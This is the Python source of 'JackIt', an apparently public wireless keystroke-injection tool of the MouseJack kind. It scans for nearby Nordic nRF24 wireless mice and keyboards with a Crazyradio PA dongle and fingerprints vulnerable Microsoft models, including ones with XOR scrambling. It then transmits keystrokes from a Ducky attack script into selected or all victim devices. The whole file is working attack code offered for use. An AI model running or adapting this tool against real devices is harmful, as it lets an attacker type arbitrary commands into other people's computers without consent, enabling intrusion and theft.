#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
from lib import nrf24
import os
import click
import tabulate
import hidscript

__version__ = 0.01
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

enable_debug = False

class DuckyParser:
    hid_map = {
        'a':            [4, False],
        'A':            [4, True],
        'b':            [5, False],
        'B':            [5, True],
        'c':            [6, False],
        'C':            [6, True],
        'd':            [7, False],
        'D':            [7, True],
        'e':            [8, False],
        'E':            [8, True],
        'f':            [9, False],
        'F':            [9, True],
        'g':            [10, False],
        'G':            [10, True],
        'h':            [11, False],
        'H':            [11, True],
        'i':            [12, False],
        'I':            [12, True],
        'j':            [13, False],
        'J':            [13, True],
        'k':            [14, False],
        'K':            [14, True],
        'l':            [15, False],
        'L':            [15, True],
        'm':            [16, False],
        'M':            [16, True],
        'n':            [17, False],
        'N':            [17, True],
        'o':            [18, False],
        'O':            [18, True],
        'p':            [19, False],
        'P':            [19, True],
        'q':            [20, False],
        'Q':            [20, True],
        'r':            [21, False],
        'R':            [21, True],
        's':            [22, False],
        'S':            [22, True],
        't':            [23, False],
        'T':            [23, True],
        'u':            [24, False],
        'U':            [24, True],
        'v':            [25, False],
        'V':            [25, True],
        'w':            [26, False],
        'W':            [26, True],
        'x':            [27, False],
        'X':            [27, True],
        'y':            [28, False],
        'Y':            [28, True],
        'z':            [29, False],
        'Z':            [29, True],
        '1':            [30, False],
        '!':            [30, True],
        '2':            [31, False],
        '@':            [31, True],
        '3':            [32, False],
        '#':            [32, True],
        '4':            [33, False],
        '$':            [33, True],
        '5':            [34, False],
        '%':            [34, True],
        '6':            [35, False],
        '^':            [35, True],
        '7':            [36, False],
        '&':            [36, True],
        '8':            [37, False],
        '*':            [37, True],
        '9':            [38, False],
        '(':            [38, True],
        '0':            [39, False],
        ')':            [39, True],
        'ENTER':        [40, False],
        'ESCAPE':       [41, False],
        'DELETE':       [42, False],
        'TAB':          [43, False],
        'SPACE':        [44, False],
        '-':            [45, False],
        '_':            [45, True],
        '=':            [46, False],
        '+':            [46, True],
        '[':            [47, False],
        '{':            [47, True],
        ']':            [48, False],
        '}':            [48, True],
        '\\':           [49, False],
        '|':            [49, True],
        ';':            [51, False],
        ':':            [51, True],
        '\'':           [52, False],
        '"':            [52, True],
        '`':            [53, False],
        '~':            [53, True],
        '.':            [55, False],
        '>':            [55, True],
        '/':            [56, False],
        '?':            [56, True],
        'CAPSLOCK':     [57, False],
        'F1':           [58, False],
        'F2':           [59, False],
        'F3':           [60, False],
        'F4':           [61, False],
        'F5':           [62, False],
        'F6':           [63, False],
        'F7':           [64, False],
        'F8':           [65, False],
        'F9':           [66, False],
        'F10':          [67, False],
        'F11':          [68, False],
        'F12':          [69, False],
        'PRINTSCREEN':  [70, False],
        'SCROLLLOCK':   [71, False],
        'PAUSE':        [72, False],
        'INSERT':       [73, False],
        'HOME':         [74, False],
        'PAGEUP':       [75, False],
        'DEL':          [76, False],
        'END':          [77, False],
        'PAGEDOWN':     [78, False],
        'RIGHT':        [79, False],
        'LEFT':         [80, False],
        'DOWN':         [81, False],
        'UP':           [82, False],
    }

    blank_entry = {
        "meta": False,
        "shift": False,
        "alt": False,
        "ctrl": False,
        "hid": 0,
        "char": '',
        "sleep": 0
    }
        
    def __init__(self, attack_script):
        self.script = attack_script.split("\n")

    def char_to_hid(self, char):
        return self.hid_map[char]

    def parse(self):
        entries = []
        for line in self.script:
            if line.startswith('ALT'):
                entry = self.blank_entry.copy()
                entry['alt'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("GUI") or line.startswith('WINDOWS') or line.startswith('COMMAND'):
                entry = self.blank_entry.copy()
                entry['meta'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('CTRL') or line.startswith('CONTROL'):
                entry = self.blank_entry.copy()
                entry['ctrl'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('SHIFT'):
                entry = self.blank_entry.copy()
                entry['shift'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("ESC") or line.startswith('APP') or line.startswith('ESCAPE'):
                entry = self.blank_entry.copy()
                entry['char'] = "ESC"
                entry['hid'], entry['shift'] = self.char_to_hid('ESC')
                entries.append(entry)

            elif line.startswith("DELAY"):
                entry = self.blank_entry.copy()
                entry['sleep'] = line.split()[1]
                entries.append(entry)

            elif line.startswith("STRING"):
                for char in " ".join(line.split()[1:]):
                    entry = self.blank_entry.copy()
                    entry['char'] = char
                    entry['hid'], entry['shift'] = self.char_to_hid(char)
                    entries.append(entry)

            elif line.startswith("ENTER"):
                entry = self.blank_entry.copy()
                entry['char'] = "\n"
                entry['hid'], entry['shift'] = self.char_to_hid('ENTER')
                entries.append(entry)
            elif len(line) == 0:
                pass
            else:
                print "CAN'T PROCESS... %s" % line
        
        return entries


class NordicScanner:

    def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
        self.radio = radio
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.ack_timeout = max(0, min(ack_timeout, 15))
        self.retries = max(0, min(retries, 15))
        self.ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')

    def _debug(self, text):
        if self.debug:
            print  P + "[D] " + W + text

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def scan(self, timeout=5.0):
        # Put the radio in promiscuous mode
        self.radio.enter_promiscuous_mode('')
        dwell_time = 0.1

        # Set the initial channel
        self.radio.set_channel(self.channels[self.channel_index])

        # Sweep through the self.channels and decode ESB packets in pseudo-promiscuous mode
        last_tune = time.time()
        total_time = time.time()

        try:
            while time.time() - total_time < timeout:

                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))

                    if a in self.devices:
                        self.devices[a]['count'] += 1
                        self.devices[a]['timestamp'] = time.time()
                        if not self.channels[self.channel_index] in self.devices[a]['channels']:
                            self.devices[a]['channels'].append(self.channels[self.channel_index])
                        # Updates the payload to the longest -- ignores packets len 20 or higher (AES keyboard)
                        if len(payload) > len(self.devices[a]['payload']) and len(payload) < 20:
                            self.devices[a]['payload'] = payload
                    else:
                            self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
                            self.devices[a]['timestamp'] = time.time()
        except RuntimeError:
            exit(-1)
        return self.devices

    def sniff(self, address):
        self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))


class NordicGenericHID:

    def __init__(self, radio, address, payload):
        self.radio = radio
        self.address = address
        self.string_address = self.hexify(address)
        self.raw_address = self.unhexify_addr(self.string_address)
        self.payload = payload[:]
        self.ack_timeout = 4
        self.retries = 15
        self.device_type = 'Generic'
        self.configure()

    def configure(self):
        raise NotImplementedError('Not implemented in generic HID')

    def hexify(self, val):
        return ':'.join('{:02X}'.format(b) for b in val)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def xor_crypt(self, pay):
        p = pay[:]
        for i in range(4, len(p)):
            p[i] ^= ord(self.raw_address[(i - 4) % 5])
        return p

    def serialize_payload(self, p):
        return str(bytearray(p))

    def checksum(self):
        self.payload[-1] = 0
        for i in range(0, len(self.payload) - 1):
            self.payload[-1] ^= self.payload[i]
        self.payload[-1] = ~self.payload[-1] & 0xff

    def inc_sequence(self):
        if self.payload[4] == 255:
            self.payload[5] += 1
            self.payload[4] = 0
        else:
            self.payload[4] += 1

    def set_key(self, key):
        raise NotImplementedError('Not implemented in generic HID')

    def clear_payload(self):
        raise NotImplementedError('Not implemented in generic HID')

    def post_keystroke_delay(self):
        pass

    def send_key(self, c=None):
        if not c:
            self.clear_payload()
            self.transmit()
        else:
            self.set_key(c)
            self.transmit()

    def transmit(self):
        self.inc_sequence()
        self.checksum()
        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
        self.post_keystroke_delay()

    def send_attack(self, attack):
        for _ in range(5):
            self.send_key()

        for c in attack:
            if c['hid']:
                self.send_key(c)
                self.send_key()
            elif c['sleep']:
                time.sleep(int(c['sleep']) / 1000)
        
        self.send_key()


class MicrosoftMouseDefaultHID(NordicGenericHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse'
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()

    def clear_payload(self):
        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        self.payload[7] = 0
        self.payload[9] = key['hid']
        if key['meta']:
            self.payload[7] |= 0x08
        if key['shift']:
            self.payload[7] |= 0x02

class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse XOR-Encrypted'
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()

    def serialize_payload(self, p):
        # re-encrypt before transmission
        return str(bytearray(self.xor_crypt(p)))

    def post_keystroke_delay(self):
        # testing found that encrypted keyboards require a short inter-key delay
        time.sleep(0.005)


class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
    def configure(self):
        self.device_type = 'Microsoft Keyboard XOR-Encrypted'
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()
    
    def clear_payload(self):
        self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        self.payload[7] = 0
        self.payload[9] = key['hid']
        if key['meta']:
            self.payload[7] |= 0x08
        if key['shift']:
            self.payload[7] |= 0x20


def fingerprint_device(r, a, p):
    if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
        # Most likely a non-XOR encrypted Microsoft mouse
        return MicrosoftMouseDefaultHID(r, a, p)
    elif len(p) == 19 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft mouse
        return MicrosoftMouseEncryptHID(r, a, p)
    elif len(p) == 16 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft keyboard
        return MicrosoftKeyboardEncryptHID(r, a, p)
    else:
        return False


def _debug(debug, text):
    if debug:
        print  P + "[D] " + W + text

def banner():
    print """
     ____.              __   .___  __   
    |    |____    ____ |  | _|   |/  |_ 
    |    \__  \ _/ ___\|  |/ /   \   __\\
/\__|    |/ __ \\\\  \___|    <|   ||  |  
\________(____  /\___  >__|_ \___||__|  
              \/     \/     \/          """

    print "JackIt Version %0.2f" % __version__
    print "Created by %s" % __authors__
    print ""

def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        print R + "[!] " + W + "You need to run as root!"
        exit(-1)

@click.command()
@click.option('--debug', is_flag=True, help='Enable debug.')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
def cli(debug, script, lowpower, interval):

    banner()

    if debug:
        print O + "[W] " + W + "Debug is enabled"

    if script == "":
        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
        exit(-1)
    else:
        f = open(script,'r')
        parser = DuckyParser(f.read())
        attack = parser.parse()
        
    confirmroot()

    # Initialize the radio
    try:
        radio = nrf24.nrf24(0)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
            exit(-1)

    # Assume Crazyradio PA
    if lowpower:
        print G + "[+] " + W + "Low power mode enabled"
    else:
        radio.enable_lna()

    # Create scanner instance
    scan = NordicScanner(radio=radio, debug=debug)

    print G + "[+] " + W + 'Scanning...'

    # Enter main loop
    try:
        try:
            while True:
                devices = scan.scan(interval)

                click.clear()
                print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                print ""
                
                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(int(time.time() - device['timestamp'])) + 's ago',
                        scan.hexify(device['payload'])
                    ])


                print tabulate.tabulate(pretty_devices, headers=["KEY","ADDRESS","CHANNELS","COUNT","SEEN","PACKET"])
        except KeyboardInterrupt:
            print ""

        if 'devices' not in locals() or len(devices) == 0:
            print R + "[!] " + W + "No devices found please try again..."
            exit(-1)
        
        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
                    " separated by commas, or '%s': " % (G + 'all' + W),
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic)-1)])
                else:
                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']

            scan.sniff(address)
            device = fingerprint_device(radio, address, payload)
            
            if device:
                for channel in channels:
                    radio.set_channel(channel)
                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
                    device.send_attack(attack)
            else:
                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (scan.hexify(address))
                continue

        print GR + '\n[+] ' + W + "All attacks completed\n"

    except KeyboardInterrupt:
        print '\n ' + R + '(^C)' + O + ' interrupted\n'
        print "[-] Quitting"

if __name__ == '__main__':
    cli()
